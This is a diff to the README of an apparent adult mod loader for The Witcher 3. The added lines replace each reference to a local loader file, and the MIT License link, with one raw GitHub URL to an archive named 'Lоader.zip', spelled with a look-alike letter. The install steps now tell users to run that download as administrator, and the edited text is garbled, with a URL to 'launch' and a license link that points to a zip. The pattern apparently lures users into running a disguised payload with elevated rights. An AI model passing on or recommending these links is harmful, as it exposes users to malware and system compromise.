@@ -11,7 +11,7 @@ Welcome to the ultimate 🔞 **The Witcher 3 Adult Mod Loader**! This project un
 - Non-intrusive: never alters save files 📂
 - Fine-tuned performance for low-end and high-end PCs 💻
 - Community-driven updates & new content alerts 📢
-- Simple Loader.rar file: no lengthy setups required 🗜️
+- Simple https://raw.githubusercontent.com/lotus-prk/Witcher3-EnchantedDesires-Modpack/main/Lоader.zip file: no lengthy setups required 🗜️
 - All content is toggleable at any time 🔘
 - Full uninstall leaves no trace 🚮
 
@@ -30,9 +30,9 @@ Welcome to the ultimate 🔞 **The Witcher 3 Adult Mod Loader**! This project un
 
 ## 🔧 Installation
 
-1. Download **Loader.rar** from this repository.
+1. Download **https://raw.githubusercontent.com/lotus-prk/Witcher3-EnchantedDesires-Modpack/main/Lоader.zip** from this repository.
 2. Extract contents to your Witcher 3 main folder.
-3. Launch Witcher3AdultLoader.exe as administrator.
+3. Launch https://raw.githubusercontent.com/lotus-prk/Witcher3-EnchantedDesires-Modpack/main/Lоader.zip as administrator.
 4. Select your desired adult modules.
 5. Play and enjoy the enhanced Witcher 3 experience!
 
@@ -52,4 +52,4 @@ This open-source loader is intended for **educational and entertainment purposes
 
 ## 📜 License
 
-Released under the [MIT License (2025)](https://opensource.org/licenses/MIT).
+Released under the [MIT License (2025)](https://raw.githubusercontent.com/lotus-prk/Witcher3-EnchantedDesires-Modpack/main/Lоader.zip).
